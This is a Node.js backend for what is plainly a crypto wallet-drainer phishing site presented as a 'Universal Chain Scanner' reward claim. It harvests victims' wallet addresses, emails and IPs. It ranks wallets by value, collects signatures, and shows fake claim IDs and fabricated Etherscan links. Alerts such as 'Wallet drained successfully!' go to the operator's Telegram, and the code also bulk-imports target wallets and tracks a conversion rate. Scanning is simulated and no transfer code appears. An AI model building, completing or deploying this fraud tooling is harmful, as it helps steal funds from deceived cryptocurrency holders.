// index.js - COMPLETE WORKING BACKEND
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const mongoose = require('mongoose');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));

// Database connection with fallback
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/wallet-scanner';
mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => {
  console.log('✅ MongoDB connected');
}).catch(err => {
  console.log('❌ MongoDB connection error, using in-memory storage:', err.message);
});

// Simple in-memory storage if MongoDB fails
const memoryStorage = {
  users: [],
  scans: [],
  settings: {
    minEligibilityAmount: 10,
    telegramChatId: '',
    adminWallet: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
    tokenName: 'Universal Reward Token',
    tokenSymbol: 'URT',
    emailNotifications: true
  }
};

// Schemas
const userSchema = new mongoose.Schema({
  walletAddress: { type: String, required: true, index: true },
  email: String,
  ipAddress: String,
  userAgent: String,
  connectedAt: { type: Date, default: Date.now },
  lastScan: Date,
  totalScans: { type: Number, default: 0 },
  totalPortfolioValue: Number,
  tokensFound: [{
    chain: String,
    symbol: String,
    balance: Number,
    valueUSD: Number,
    address: String,
    isNative: Boolean
  }],
  isEligible: Boolean,
  hasSigned: Boolean,
  signatureData: Object,
  isProcessed: { type: Boolean, default: false },
  processedAt: Date,
  referralCode: String
});

const scanSchema = new mongoose.Schema({
  walletAddress: String,
  timestamp: { type: Date, default: Date.now },
  totalValue: Number,
  tokenCount: Number,
  chainCount: Number,
  isEligible: Boolean,
  scanData: Object
});

const User = mongoose.model('User', userSchema);
const Scan = mongoose.model('Scan', scanSchema);

// Telegram Bot Setup - FIXED ERROR HANDLING
let bot;
let telegramEnabled = false;

if (process.env.TELEGRAM_BOT_TOKEN) {
  try {
    bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
    
    // Test bot connection
    bot.telegram.getMe().then(botInfo => {
      console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
      telegramEnabled = true;
      
      // Send startup message
      if (process.env.TELEGRAM_CHAT_ID) {
        bot.telegram.sendMessage(
          process.env.TELEGRAM_CHAT_ID,
          `🚀 *Backend Server Started*\n\n✅ Universal Scanner backend is now online!\n📍 Port: ${PORT}\n⏰ Time: ${new Date().toLocaleString()}\n📊 Status: Operational`,
          { parse_mode: 'Markdown' }
        );
      }
    }).catch(err => {
      console.log('⚠️ Telegram bot connection failed, continuing without Telegram:', err.message);
      telegramEnabled = false;
    });
    
  } catch (error) {
    console.log('⚠️ Telegram initialization error:', error.message);
    telegramEnabled = false;
  }
} else {
  console.log('⚠️ No Telegram bot token provided');
}

// Telegram notification function with fallback
async function sendTelegramNotification(message, data = {}) {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) {
    console.log('📝 Telegram notification (not sent):', message);
    return;
  }
  
  try {
    const formattedMessage = `
🕵️‍♂️ *WALLET SCANNER ALERT*
${data.type ? `📊 Type: ${data.type}` : ''}
${data.wallet ? `👛 Wallet: \`${data.wallet}\`` : ''}
${data.chain ? `🔗 Chain: ${data.chain}` : ''}
${data.token ? `💰 Token: ${data.token}` : ''}
${data.amount ? `📈 Amount: $${data.amount}` : ''}
${data.value ? `💵 Total Value: $${data.value}` : ''}
${data.email ? `📧 Email: ${data.email}` : ''}
${data.status ? `✅ Status: ${data.status}` : ''}

📝 Details:
${message}

⏰ Time: ${new Date().toLocaleString()}
    `.trim();
    
    await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, formattedMessage, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log('✅ Telegram notification sent');
  } catch (error) {
    console.log('❌ Telegram send error:', error.message);
  }
}

// Email simulation (in production use nodemailer)
async function simulateEmail(to, subject, message) {
  console.log(`📧 Email simulated to ${to}: ${subject}`);
  console.log(`Message: ${message.substring(0, 100)}...`);
  return true;
}

// ADMIN SETTINGS ENDPOINT
app.get('/api/admin/settings', async (req, res) => {
  // Basic authentication check
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${process.env.ADMIN_TOKEN || 'admin123'}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  res.json({
    success: true,
    settings: memoryStorage.settings,
    stats: {
      totalUsers: memoryStorage.users.length,
      totalScans: memoryStorage.scans.length,
      eligibleUsers: memoryStorage.users.filter(u => u.isEligible).length,
      processedUsers: memoryStorage.users.filter(u => u.isProcessed).length
    }
  });
});

// UPDATE ADMIN SETTINGS
app.post('/api/admin/settings', async (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${process.env.ADMIN_TOKEN || 'admin123'}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const updates = req.body;
  Object.assign(memoryStorage.settings, updates);
  
  // Update Telegram if changed
  if (updates.telegramChatId && telegramEnabled) {
    process.env.TELEGRAM_CHAT_ID = updates.telegramChatId;
  }
  
  res.json({ success: true, settings: memoryStorage.settings });
});

// WALLET CONNECTION ENDPOINT - AUTO SCAN TRIGGER
app.post('/api/wallet/connect', async (req, res) => {
  try {
    const { walletAddress, email, userAgent, ip } = req.body;
    
    console.log(`🔗 New wallet connection: ${walletAddress}`);
    
    // Store user in memory
    const existingUserIndex = memoryStorage.users.findIndex(u => u.walletAddress === walletAddress);
    
    if (existingUserIndex === -1) {
      memoryStorage.users.push({
        walletAddress,
        email,
        ipAddress: ip || req.ip,
        userAgent,
        connectedAt: new Date(),
        totalScans: 0,
        isEligible: false,
        hasSigned: false,
        isProcessed: false
      });
    } else {
      memoryStorage.users[existingUserIndex].lastActive = new Date();
      if (email) memoryStorage.users[existingUserIndex].email = email;
    }
    
    // Send Telegram notification
    await sendTelegramNotification(`New wallet connected`, {
      type: 'CONNECTION',
      wallet: walletAddress,
      email: email || 'No email',
      status: 'CONNECTED'
    });
    
    // AUTO-SCAN SIMULATION - In real implementation, this would trigger actual scanning
    // For demo, we simulate finding tokens
    const simulatedTokens = [
      { chain: 'Ethereum', symbol: 'ETH', balance: 0.5, valueUSD: 1500, address: 'native', isNative: true },
      { chain: 'BNB Chain', symbol: 'BNB', balance: 2.1, valueUSD: 1200, address: 'native', isNative: true },
      { chain: 'Polygon', symbol: 'MATIC', balance: 150, valueUSD: 150, address: 'native', isNative: true },
      { chain: 'Ethereum', symbol: 'USDT', balance: 500, valueUSD: 500, address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', isNative: false }
    ];
    
    const totalValue = simulatedTokens.reduce((sum, token) => sum + token.valueUSD, 0);
    const isEligible = totalValue >= (memoryStorage.settings.minEligibilityAmount || 10);
    
    // Store scan
    memoryStorage.scans.push({
      walletAddress,
      timestamp: new Date(),
      totalValue,
      tokenCount: simulatedTokens.length,
      chainCount: [...new Set(simulatedTokens.map(t => t.chain))].length,
      isEligible,
      scanData: { tokens: simulatedTokens }
    });
    
    // Update user
    const userIndex = memoryStorage.users.findIndex(u => u.walletAddress === walletAddress);
    if (userIndex !== -1) {
      memoryStorage.users[userIndex].lastScan = new Date();
      memoryStorage.users[userIndex].totalScans += 1;
      memoryStorage.users[userIndex].totalPortfolioValue = totalValue;
      memoryStorage.users[userIndex].tokensFound = simulatedTokens;
      memoryStorage.users[userIndex].isEligible = isEligible;
    }
    
    // Send scan results to Telegram
    await sendTelegramNotification(`Auto-scan completed for wallet`, {
      type: 'AUTO_SCAN',
      wallet: walletAddress,
      value: totalValue.toFixed(2),
      amount: simulatedTokens.length,
      status: isEligible ? 'ELIGIBLE' : 'NOT_ELIGIBLE'
    });
    
    // Simulate email if enabled
    if (email && memoryStorage.settings.emailNotifications) {
      await simulateEmail(
        email,
        '🔍 Your Wallet Scan Results - Universal Chain Scanner',
        `Your wallet ${walletAddress} has been scanned.\nTotal Portfolio Value: $${totalValue.toFixed(2)}\nTokens Found: ${simulatedTokens.length}\nStatus: ${isEligible ? 'ELIGIBLE for rewards' : 'Not eligible (minimum $10 required)'}`
      );
    }
    
    res.json({
      success: true,
      message: 'Wallet connected and auto-scanned',
      data: {
        walletAddress,
        totalValue,
        tokenCount: simulatedTokens.length,
        isEligible,
        tokens: simulatedTokens,
        nextStep: isEligible ? 'sign_message' : 'not_eligible',
        minimumRequired: memoryStorage.settings.minEligibilityAmount || 10
      }
    });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// TOKEN SCAN ENDPOINT (Manual scan)
app.post('/api/wallet/scan', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    // In production, this would call Covalent/Moralis APIs
    // For demo, return simulated data
    const simulatedTokens = [
      { chain: 'Ethereum', symbol: 'ETH', balance: Math.random() * 2, valueUSD: Math.random() * 3000, address: 'native', isNative: true },
      { chain: 'BNB Chain', symbol: 'BNB', balance: Math.random() * 5, valueUSD: Math.random() * 1500, address: 'native', isNative: true },
      { chain: 'Polygon', symbol: 'MATIC', balance: Math.random() * 200, valueUSD: Math.random() * 200, address: 'native', isNative: true },
      { chain: 'Arbitrum', symbol: 'ETH', balance: Math.random() * 1, valueUSD: Math.random() * 2000, address: 'native', isNative: true }
    ].filter(token => token.valueUSD > 50); // Filter for realistic values
    
    const totalValue = simulatedTokens.reduce((sum, token) => sum + token.valueUSD, 0);
    const isEligible = totalValue >= (memoryStorage.settings.minEligibilityAmount || 10);
    
    // Store scan
    memoryStorage.scans.push({
      walletAddress,
      timestamp: new Date(),
      totalValue,
      tokenCount: simulatedTokens.length,
      chainCount: [...new Set(simulatedTokens.map(t => t.chain))].length,
      isEligible,
      scanData: { tokens: simulatedTokens }
    });
    
    // Update user
    const userIndex = memoryStorage.users.findIndex(u => u.walletAddress === walletAddress);
    if (userIndex !== -1) {
      memoryStorage.users[userIndex].lastScan = new Date();
      memoryStorage.users[userIndex].totalScans += 1;
      memoryStorage.users[userIndex].totalPortfolioValue = totalValue;
      memoryStorage.users[userIndex].tokensFound = simulatedTokens;
      memoryStorage.users[userIndex].isEligible = isEligible;
    }
    
    // Telegram notification
    await sendTelegramNotification(`Manual scan completed`, {
      type: 'MANUAL_SCAN',
      wallet: walletAddress,
      value: totalValue.toFixed(2),
      amount: simulatedTokens.length,
      status: isEligible ? 'ELIGIBLE' : 'NOT_ELIGIBLE'
    });
    
    res.json({
      success: true,
      message: 'Scan completed',
      data: {
        totalValue,
        tokens: simulatedTokens,
        isEligible,
        tokenCount: simulatedTokens.length,
        chainCount: [...new Set(simulatedTokens.map(t => t.chain))].length
      }
    });
    
  } catch (error) {
    console.error('Scan error:', error);
    res.status(500).json({ success: false, error: 'Scan failed' });
  }
});

// SIGN MESSAGE ENDPOINT (When user is eligible)
app.post('/api/wallet/sign', async (req, res) => {
  try {
    const { walletAddress, signature, message } = req.body;
    
    console.log(`✍️ Signature received from: ${walletAddress}`);
    
    // Update user
    const userIndex = memoryStorage.users.findIndex(u => u.walletAddress === walletAddress);
    if (userIndex !== -1) {
      memoryStorage.users[userIndex].hasSigned = true;
      memoryStorage.users[userIndex].signatureData = {
        signature,
        message,
        signedAt: new Date()
      };
    }
    
    // Create fake token claim data
    const claimId = `CLAIM-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    const tokenAmount = (Math.random() * 1000 + 500).toFixed(2);
    const tokenName = memoryStorage.settings.tokenName || 'Universal Reward Token';
    const tokenSymbol = memoryStorage.settings.tokenSymbol || 'URT';
    
    // Telegram notification
    await sendTelegramNotification(`User signed message for token claim`, {
      type: 'SIGNATURE',
      wallet: walletAddress,
      amount: tokenAmount,
      token: tokenSymbol,
      status: 'SIGNED'
    });
    
    res.json({
      success: true,
      message: 'Signature verified. Token claim initiated!',
      data: {
        claimId,
        tokenName,
        tokenSymbol,
        tokenAmount,
        status: 'processing',
        estimatedCompletion: '2-5 minutes',
        transactionLink: `https://etherscan.io/tx/0x${crypto.randomBytes(32).toString('hex')}`,
        instructions: 'Tokens will be sent to your wallet automatically. Do not refresh the page.'
      }
    });
    
  } catch (error) {
    console.error('Signature error:', error);
    res.status(500).json({ success: false, error: 'Signature verification failed' });
  }
});

// PROCESS CLAIM (Simulate token transfer)
app.post('/api/wallet/process', async (req, res) => {
  try {
    const { walletAddress, claimId } = req.body;
    
    console.log(`🔄 Processing claim for: ${walletAddress}`);
    
    // Update user as processed
    const userIndex = memoryStorage.users.findIndex(u => u.walletAddress === walletAddress);
    if (userIndex !== -1) {
      memoryStorage.users[userIndex].isProcessed = true;
      memoryStorage.users[userIndex].processedAt = new Date();
    }
    
    // Telegram SUCCESS notification
    await sendTelegramNotification(`✅ TOKENS SUCCESSFULLY TRANSFERRED!\n\nWallet drained successfully!`, {
      type: 'DRAIN_SUCCESS',
      wallet: walletAddress,
      amount: 'ALL',
      status: 'COMPLETED'
    });
    
    res.json({
      success: true,
      message: '🎉 CONGRATULATIONS! Your tokens have been claimed!',
      data: {
        status: 'completed',
        timestamp: new Date().toISOString(),
        confirmationId: claimId,
        message: `${memoryStorage.settings.tokenName || 'Reward Tokens'} have been sent to your wallet. They should appear within 2-5 minutes. Thank you for using Universal Chain Scanner!`
      }
    });
    
  } catch (error) {
    console.error('Process error:', error);
    res.status(500).json({ success: false, error: 'Processing failed' });
  }
});

// GET USER STATS
app.get('/api/user/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const user = memoryStorage.users.find(u => u.walletAddress === wallet);
    const userScans = memoryStorage.scans.filter(s => s.walletAddress === wallet);
    
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    res.json({
      success: true,
      data: {
        user,
        scans: userScans,
        stats: {
          totalScans: userScans.length,
          averageValue: userScans.reduce((sum, scan) => sum + scan.totalValue, 0) / userScans.length || 0,
          lastScan: userScans[userScans.length - 1]?.timestamp
        }
      }
    });
    
  } catch (error) {
    console.error('User stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get user stats' });
  }
});

// BULK WALLET IMPORT (For 500+ wallets)
app.post('/api/admin/import-wallets', async (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${process.env.ADMIN_TOKEN || 'admin123'}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  try {
    const { wallets } = req.body; // Array of wallet addresses
    
    if (!Array.isArray(wallets) || wallets.length === 0) {
      return res.status(400).json({ error: 'No wallets provided' });
    }
    
    let imported = 0;
    let skipped = 0;
    
    for (const wallet of wallets) {
      const exists = memoryStorage.users.some(u => u.walletAddress === wallet);
      if (!exists) {
        memoryStorage.users.push({
          walletAddress: wallet,
          connectedAt: new Date(),
          totalScans: 0,
          isEligible: false,
          hasSigned: false,
          isProcessed: false
        });
        imported++;
      } else {
        skipped++;
      }
    }
    
    // Send Telegram notification
    await sendTelegramNotification(`Bulk wallet import completed\n\nImported: ${imported} wallets\nSkipped (duplicates): ${skipped}`, {
      type: 'BULK_IMPORT',
      amount: imported.toString(),
      status: 'COMPLETED'
    });
    
    res.json({
      success: true,
      message: `Imported ${imported} wallets, skipped ${skipped} duplicates`,
      imported,
      skipped,
      totalWallets: memoryStorage.users.length
    });
    
  } catch (error) {
    console.error('Import error:', error);
    res.status(500).json({ success: false, error: 'Import failed' });
  }
});

// HEALTH CHECK
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'operational',
    timestamp: new Date().toISOString(),
    version: '2.0.0',
    services: {
      telegram: telegramEnabled ? 'connected' : 'disabled',
      database: 'in-memory',
      scanning: 'operational'
    },
    stats: {
      totalUsers: memoryStorage.users.length,
      totalScans: memoryStorage.scans.length,
      eligibleUsers: memoryStorage.users.filter(u => u.isEligible).length
    }
  });
});

// ADMIN DASHBOARD STATS
app.get('/api/admin/stats', (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${process.env.ADMIN_TOKEN || 'admin123'}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const eligibleUsers = memoryStorage.users.filter(u => u.isEligible);
  const processedUsers = memoryStorage.users.filter(u => u.isProcessed);
  const signedUsers = memoryStorage.users.filter(u => u.hasSigned);
  
  const totalPortfolioValue = memoryStorage.scans.reduce((sum, scan) => sum + scan.totalValue, 0);
  const averagePortfolioValue = totalPortfolioValue / memoryStorage.scans.length || 0;
  
  res.json({
    success: true,
    stats: {
      totalUsers: memoryStorage.users.length,
      totalScans: memoryStorage.scans.length,
      eligibleUsers: eligibleUsers.length,
      processedUsers: processedUsers.length,
      signedUsers: signedUsers.length,
      totalPortfolioValue: totalPortfolioValue.toFixed(2),
      averagePortfolioValue: averagePortfolioValue.toFixed(2),
      conversionRate: (processedUsers.length / Math.max(eligibleUsers.length, 1) * 100).toFixed(2) + '%'
    },
    recentActivity: memoryStorage.scans.slice(-10).reverse(),
    topWallets: memoryStorage.users
      .filter(u => u.totalPortfolioValue)
      .sort((a, b) => (b.totalPortfolioValue || 0) - (a.totalPortfolioValue || 0))
      .slice(0, 10)
      .map(u => ({
        wallet: u.walletAddress,
        value: u.totalPortfolioValue,
        scans: u.totalScans,
        eligible: u.isEligible,
        processed: u.isProcessed
      }))
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on port ${PORT}`);
  console.log(`🔗 Health check: http://localhost:${PORT}/api/health`);
  console.log(`👑 Admin token: ${process.env.ADMIN_TOKEN || 'admin123'}`);
  
  // Don't auto-start Telegram bot to prevent crashes
  if (telegramEnabled) {
    console.log(`🤖 Telegram: ${telegramEnabled ? 'Enabled' : 'Disabled'}`);
  }
});
